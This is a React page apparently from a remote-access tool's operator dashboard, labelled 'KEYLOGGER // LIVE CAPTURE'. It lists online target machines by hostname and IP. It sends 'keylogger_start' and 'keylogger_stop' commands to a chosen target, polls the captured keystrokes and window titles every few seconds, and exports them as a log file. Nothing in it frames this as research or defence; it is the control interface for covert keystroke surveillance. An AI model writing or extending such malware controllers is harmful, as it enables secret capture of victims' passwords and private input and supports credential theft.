import { useState } from "react";
import { Sidebar } from "@/components/layout/sidebar";
import { GlitchText } from "@/components/ui/glitch-text";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { 
  Select, 
  SelectContent, 
  SelectItem, 
  SelectTrigger, 
  SelectValue 
} from "@/components/ui/select";
import { 
  Keyboard, 
  Play, 
  Square, 
  Download, 
  Trash2, 
  Clock,
  Monitor,
  RefreshCw
} from "lucide-react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { motion, AnimatePresence } from "framer-motion";
import { cn } from "@/lib/utils";
import type { Target, Keystroke } from "@shared/schema";

export default function KeyloggerPage() {
  const [selectedTarget, setSelectedTarget] = useState<string>("");
  const [isCapturing, setIsCapturing] = useState(false);
  const queryClient = useQueryClient();

  const { data: targets } = useQuery<Target[]>({
    queryKey: ["/api/targets"],
    queryFn: async () => {
      const res = await fetch("/api/targets");
      if (!res.ok) return [];
      return res.json();
    },
  });

  const { data: keystrokes, refetch: refetchKeystrokes } = useQuery<Keystroke[]>({
    queryKey: ["/api/targets", selectedTarget, "keystrokes"],
    queryFn: async () => {
      if (!selectedTarget) return [];
      const res = await fetch(`/api/targets/${selectedTarget}/keystrokes`);
      if (!res.ok) return [];
      return res.json();
    },
    enabled: !!selectedTarget,
    refetchInterval: isCapturing ? 3000 : false,
  });

  const isValidTarget = selectedTarget && selectedTarget !== "" && selectedTarget !== "none";

  const startCaptureMutation = useMutation({
    mutationFn: async () => {
      if (!isValidTarget) throw new Error("No valid target selected");
      const res = await fetch(`/api/targets/${selectedTarget}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: "keylogger_start" }),
      });
      if (!res.ok) throw new Error("Failed to start capture");
      return res.json();
    },
    onSuccess: () => {
      setIsCapturing(true);
      queryClient.invalidateQueries({ queryKey: ["/api/targets", selectedTarget, "keystrokes"] });
    },
  });

  const stopCaptureMutation = useMutation({
    mutationFn: async () => {
      if (!isValidTarget) throw new Error("No valid target selected");
      const res = await fetch(`/api/targets/${selectedTarget}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: "keylogger_stop" }),
      });
      if (!res.ok) throw new Error("Failed to stop capture");
      return res.json();
    },
    onSuccess: () => {
      setIsCapturing(false);
      queryClient.invalidateQueries({ queryKey: ["/api/targets", selectedTarget, "keystrokes"] });
    },
  });

  const onlineTargets = targets?.filter(t => t.status === "online") || [];
  const selectedTargetData = targets?.find(t => t.id.toString() === selectedTarget);

  const handleExportLogs = () => {
    if (!keystrokes || keystrokes.length === 0) return;
    const content = keystrokes.map(k => 
      `[${k.createdAt ? new Date(k.createdAt).toLocaleString() : "Unknown"}] ${k.window}: ${k.content}`
    ).join("\n");
    const blob = new Blob([content], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `keylog_${selectedTargetData?.uniqueCode || selectedTarget}_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="flex h-screen w-full bg-background text-foreground font-mono overflow-hidden">
      <Sidebar />
      
      <main className="flex-1 flex flex-col overflow-hidden relative">
        <header className="h-16 border-b border-primary/20 flex items-center justify-between px-6 bg-black/50 backdrop-blur-sm">
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-bold tracking-tight">
              <GlitchText text="KEYLOGGER // LIVE CAPTURE" />
            </h1>
          </div>
          <div className="flex items-center gap-2 text-xs text-primary/60">
            <Keyboard className="w-4 h-4 animate-pulse" />
            <span>KEYSTROKE_MONITOR</span>
          </div>
        </header>

        <div className="flex-1 overflow-hidden flex flex-col p-6 pb-20 gap-6">
          <div className="flex items-center gap-4">
            <Select value={selectedTarget} onValueChange={setSelectedTarget}>
              <SelectTrigger className="w-80 bg-black/50 border-primary/30" data-testid="select-target">
                <SelectValue placeholder="Select target device..." />
              </SelectTrigger>
              <SelectContent>
                {onlineTargets.map((target) => (
                  <SelectItem key={target.id} value={target.id.toString()}>
                    <div className="flex items-center gap-2">
                      <Monitor className="w-4 h-4" />
                      <span>{target.hostname || target.ip}</span>
                      <Badge variant="outline" className="text-[10px] ml-2">
                        {target.uniqueCode?.slice(0, 8)}
                      </Badge>
                    </div>
                  </SelectItem>
                ))}
                {onlineTargets.length === 0 && (
                  <SelectItem value="none" disabled>No online targets</SelectItem>
                )}
              </SelectContent>
            </Select>

            <div className="flex gap-2">
              <Button
                onClick={() => startCaptureMutation.mutate()}
                disabled={!isValidTarget || isCapturing}
                className="bg-green-600 hover:bg-green-700"
                data-testid="button-start-capture"
              >
                <Play className="w-4 h-4 mr-2" />
                Start Capture
              </Button>
              <Button
                onClick={() => stopCaptureMutation.mutate()}
                disabled={!isValidTarget || !isCapturing}
                variant="destructive"
                data-testid="button-stop-capture"
              >
                <Square className="w-4 h-4 mr-2" />
                Stop
              </Button>
              <Button
                onClick={() => refetchKeystrokes()}
                disabled={!isValidTarget}
                variant="outline"
                className="border-primary/30"
                data-testid="button-refresh"
              >
                <RefreshCw className="w-4 h-4" />
              </Button>
            </div>

            {isCapturing && (
              <Badge className="bg-red-500 animate-pulse">
                RECORDING
              </Badge>
            )}
          </div>

          <Card className="flex-1 bg-black/40 border-primary/20 backdrop-blur-md flex flex-col overflow-hidden">
            <div className="p-4 border-b border-primary/10 flex items-center justify-between bg-primary/5">
              <div className="flex items-center gap-3">
                <Keyboard className="w-5 h-5 text-primary" />
                <span className="text-sm font-bold text-primary">Keystroke Log</span>
                {selectedTargetData && (
                  <Badge variant="outline" className="text-[10px]">
                    {selectedTargetData.hostname || selectedTargetData.ip}
                  </Badge>
                )}
              </div>
              <div className="flex gap-2">
                <Button
                  size="sm"
                  variant="outline"
                  onClick={handleExportLogs}
                  disabled={!keystrokes || keystrokes.length === 0}
                  className="border-primary/30 text-xs"
                  data-testid="button-export"
                >
                  <Download className="w-3 h-3 mr-1" />
                  Export
                </Button>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto p-4 space-y-2">
              {!selectedTarget ? (
                <div className="h-full flex flex-col items-center justify-center text-muted-foreground opacity-50 gap-2">
                  <Keyboard className="w-12 h-12" />
                  <span>Select a target to view keystrokes</span>
                </div>
              ) : keystrokes && keystrokes.length > 0 ? (
                <AnimatePresence>
                  {keystrokes.map((keystroke) => (
                    <motion.div
                      key={keystroke.id}
                      initial={{ opacity: 0, y: -10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="p-3 border border-primary/10 rounded bg-black/50"
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <Monitor className="w-3 h-3 text-primary/60" />
                          <span className="text-xs text-primary/80 font-medium">
                            {keystroke.window || "Unknown Window"}
                          </span>
                        </div>
                        <div className="flex items-center gap-1 text-[10px] text-muted-foreground">
                          <Clock className="w-3 h-3" />
                          {keystroke.createdAt ? new Date(keystroke.createdAt).toLocaleString() : "Unknown"}
                        </div>
                      </div>
                      <div className="font-mono text-sm text-primary/90 bg-black/30 p-2 rounded">
                        {keystroke.content}
                      </div>
                    </motion.div>
                  ))}
                </AnimatePresence>
              ) : (
                <div className="h-full flex flex-col items-center justify-center text-muted-foreground opacity-50 gap-2">
                  <Keyboard className="w-12 h-12" />
                  <span>No keystrokes captured yet</span>
                  <span className="text-xs">Click "Start Capture" to begin recording</span>
                </div>
              )}
            </div>

            <div className="p-2 border-t border-primary/10 bg-black/50 text-[10px] text-primary/40 text-right px-4">
              {keystrokes?.length || 0} entries captured
            </div>
          </Card>
        </div>
      </main>
    </div>
  );
}
